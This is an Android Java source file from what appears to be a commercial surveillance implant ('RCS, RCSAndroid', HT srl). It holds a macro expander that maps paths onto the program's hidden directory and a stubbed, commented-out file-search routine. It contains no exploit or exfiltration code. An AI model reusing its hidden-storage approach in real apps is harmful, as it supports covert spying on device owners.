/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : Directory.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.file;

import java.util.Enumeration;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Directory.
 */
public class Directory {
	// #ifdef DEBUG
	/** The debug. */
	private static Debug debug = new Debug("Directory");
	// #endif

	/** The hidden dir macro. */
	public static String hiddenDirMacro = "$dir$";

	/**
	 * Expand macro.
	 *
	 * @param filename the filename
	 * @return the string
	 */
	public static String expandMacro(final String filename) {
		final int macro = filename.indexOf(hiddenDirMacro, 0);
		String expandedFilter = filename;
		if (macro == 0) {
			// #ifdef DEBUG
			debug.trace("expanding macro");
			// #endif
			// final String first = filter.substring(0, macro);
			final String end = filename.substring(macro
					+ hiddenDirMacro.length(), filename.length());
			expandedFilter = Utils.chomp(Path.hidden(), "/") + end; // Path.UPLOAD_DIR

			// #ifdef DEBUG
			debug.trace("expandedFilter: " + expandedFilter);
			// #endif
		}
		return expandedFilter;
	}

	// TODO
	/**
	 * Find.
	 *
	 * @param filter the filter
	 * @return the enumeration
	 */
	public static Enumeration<String> find(final String filter) {

		return null;
		/*
		 * //#ifdef DBC Check.requires(!filter.startsWith("file://"),
		 * "find filter shouldn't start with file:// : " + filter); //#endif
		 * 
		 * if (filter.indexOf('*') >= 0) { //#ifdef DEBUG
		 * debug.trace("asterisc"); //#endif
		 * 
		 * // filter String baseDir = filter.substring(0,
		 * filter.lastIndexOf('/')); final String asterisc = filter
		 * .substring(filter.lastIndexOf('/') + 1);
		 * 
		 * if (baseDir == "") { baseDir = "/"; }
		 * 
		 * File fconn = null; try { fconn = new File("file://" + baseDir);
		 * 
		 * if (!fconn.isDirectory() || !fconn.canRead()) { //#ifdef DEBUG
		 * debug.error("not a dir or cannot read"); //#endif return new
		 * EmptyEnumeration(); }
		 * 
		 * return fconn.list(asterisc, true);
		 * 
		 * } catch (final IOException ex) { //#ifdef DEBUG debug.error(ex);
		 * //#endif } finally { try { if (fconn != null) fconn.close(); } catch
		 * (IOException e) { } } } else { // single file //#ifdef DEBUG
		 * debug.trace("single file"); //#endif FileConnection fconn = null; try
		 * { fconn = (FileConnection) Connector.open("file://" + filter,
		 * Connector.READ);
		 * 
		 * if (!fconn.exists() || fconn.isDirectory() || !fconn.canRead()) {
		 * //#ifdef DEBUG debug.error("not exists, a dir or cannot read");
		 * //#endif return new EmptyEnumeration(); }
		 * 
		 * return new ObjectEnumerator(new Object[] { fconn });
		 * 
		 * } catch (final IOException ex) { //#ifdef DEBUG debug.error(ex);
		 * //#endif fconn = null; } finally { try { //#ifdef DEBUG
		 * debug.trace("closing"); //#endif if (fconn != null) fconn.close(); }
		 * catch (Exception e) { } } }
		 * 
		 * //#ifdef DEBUG debug.trace("exiting"); //#endif return new
		 * EmptyEnumeration();
		 */
	}
}
